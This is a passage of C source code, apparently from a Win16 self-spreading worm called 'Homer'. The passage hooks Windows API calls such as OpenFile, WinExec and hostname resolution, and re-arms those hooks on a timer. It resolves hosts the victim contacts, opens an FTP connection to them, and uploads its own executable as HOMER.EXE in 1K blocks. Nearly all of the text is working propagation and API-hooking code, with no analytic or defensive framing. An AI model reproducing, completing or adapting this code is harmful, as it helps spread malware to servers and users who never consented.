                               WSAAsyncSelect(server_socket,global_hwnd,WSA_SOCKET_SERVER,
                                   FD_READ | FD_WRITE | FD_CONNECT | FD_CLOSE | FD_OOB | FD_ACCEPT);


   /* wait for remote site to call us back */
                               result=listen(server_socket,5);
                               other_side_len=sizeof(other_side);
                               new_socket=accept(server_socket,&other_side,&other_side_len);

   /* send to the host on the other side the PORt command with information about our
       host ip and port where we are listening. Finally issue to command to upload homer*/
                               my_client_info_len=sizeof(my_client_info);
                               getsockname(client_socket,(struct sockaddr *) &my_client_info,&my_client_info_len);
                               my_info_len=sizeof(my_info);
                               getsockname(server_socket,(struct sockaddr *) &my_info,&my_info_len);

                               sprintf(buf,"\nTYPE I\nPORT %d,%d,%d,%d,%d,%d\nSTOR HOMER.EXE\n",
                                               my_client_info.sin_addr.S_un.S_un_b.s_b1,
                                               my_client_info.sin_addr.S_un.S_un_b.s_b2,
                                               my_client_info.sin_addr.S_un.S_un_b.s_b3,
                                               my_client_info.sin_addr.S_un.S_un_b.s_b4,
                                               my_info.sin_port % 256,
                                               my_info.sin_port >> 8
                                         );
                               send(client_socket,buf,sizeof(buf),0);
                               ftpstatus=4;
                               }
                           break;
                   }
                   return 0;
               case WSA_SOCKET_SERVER:
                   switch (WSAGETSELECTEVENT(lParam))
                   {
                       case FD_ACCEPT:         /* the host on the other side called us for*/
                           progress=0;             /* a copy of Homer :-) */
                           other_side_len=sizeof(other_side);
                           new_socket=accept(server_socket,&other_side,&other_side_len);
                           setsockopt(new_socket,SOL_SOCKET,SO_LINGER,&mylinger,sizeof(mylinger));
                           ftpstatus=5;
                           recv(new_socket,msg_text,1024,0);
                           break;
                       case FD_WRITE:
                           break;
                       case FD_READ:
                               recv(new_socket,msg_text,1024,0); /* keep input buffer free */
                           break;
                   }
                   return 0;
               case WSA_DNS:
                   if (WSAGETASYNCERROR(lParam))
                   {
                       ftpstatus=0;            /* name resolution failed ! */
                       closesocket(client_socket);
                   }
                   else
                   {
                       ftpstatus=2;            /* name resolution ok, create ftp control connection */
                       server_sck_addr.sin_family=AF_INET;
                       host_info=(LPHOSTENT *) &resolver_buf;
                       memcpy(&(server_sck_addr.sin_addr), host_info->h_addr,host_info->h_length);
                       service_info=getservbyname("ftp","tcp");
                       server_sck_addr.sin_port=service_info->s_port;
                       connect(client_socket,(LPSOCKADDR)&server_sck_addr,sizeof(server_sck_addr));

   #ifdef HASWINDOW
                       resolved ++;
   #endif
                   }
                   return 0;
   #endif
               case WM_ENDSESSION:
                   CleanUp();
                   return 0;
               case WM_DESTROY:
                   PostQuitMessage(0);
                   return 0;
               default:
                   return DefWindowProc (hwnd, message, wParam, lParam) ;
           }
   }
   #endif

   WORD FAR PASCAL _export TimerProc( HWND tphwnd, WORD wMsg, int TimerID, DWORD dwTime)
   {
   #ifdef HOOKSWIN16API
   /* reactivate api hookers if needed */
       if (!activeOpenFile && saveOpenFile.wh)
           {
               activewin16api(&saveOpenFile,i1);
               activeOpenFile=1;
           }
       if (!activeWinExec && saveWinExec.wh)
           {
               activewin16api(&saveWinExec,i2);
               activeWinExec=1;
           }
   #endif

   #ifdef NETHOOK
       if ( (ftpstatus!=0) && (ftpstatus!=999) )
   /* here we adjust timeout counter for ftp connection */
           {
               conn_timeout++;
               if (conn_timeout>1800) /* 30 minutes */
                                   {
                                       ftpstatus=0;
                                       closesocket(new_socket);
                                       closesocket(client_socket);
                                       closesocket(server_socket);
                                   }
           }
       if (ftpstatus==5)
   /* if ftp status is 5 we send homer via ftp in 1K block, one per second or less
       if the connection is too slow */
           {
               int sent;
                                   if (progress>=mysize)
                                   {
                                       ftpstatus=0;
                                       closesocket(new_socket);
                                       closesocket(client_socket);
                                       closesocket(server_socket);
                                   }
                                   else
                                   {
                                       sent=send(new_socket,mybuffer+progress,min(1024,mysize-progress),0);
                                       if (sent!=-1) progress+=sent;
                                   }
           }
       if (slotstatus && !ftpstatus)
           {
   /* start transer of homer via ftp to the other side */
   /* create socket at our side */
               ftpstatus=1;
               conn_timeout=0;
               slotstatus=0;
               client_socket=socket(PF_INET,SOCK_STREAM,0);

               if (client_socket==INVALID_SOCKET)
               {
                   ftpstatus=0;
               }

             setsockopt(client_socket,SOL_SOCKET,SO_LINGER,&mylinger,sizeof(mylinger));

             client_sck_addr.sin_family=AF_INET;
             client_sck_addr.sin_addr.s_addr=INADDR_ANY;
             client_sck_addr.sin_port=0;

             if (bind(client_socket,(LPSOCKADDR)&client_sck_addr,sizeof(client_sck_addr))==SOCKET_ERROR)
             {
               ftpstatus=0;
             }

             service_info=getservbyname(service_name,"tcp");

             WSAAsyncSelect(client_socket,hwnd,WSA_SOCKET,
                                   FD_READ | FD_WRITE | FD_CONNECT | FD_CLOSE | FD_OOB );

               strncpy(tmp_hostname,hostname,MAX_HOSTNAME);
   /* start name resolution */
               ath=WSAAsyncGetHostByName(hwnd,WSA_DNS,tmp_hostname,resolver_buf,MAXGETHOSTSTRUCT);
           }

   /* reactivate resolver hook */
       if (!activeGetHostByName && saveGetHostByName.wh)
           {
               activewin16api(&saveGetHostByName,i3);
               activeGetHostByName=1;
           }
       if (!activeWSAGetHostByName && saveWSAGetHostByName.wh)
           {
               activewin16api(&saveWSAGetHostByName,i4);
               activeWSAGetHostByName=1;
           }
   #endif

   }
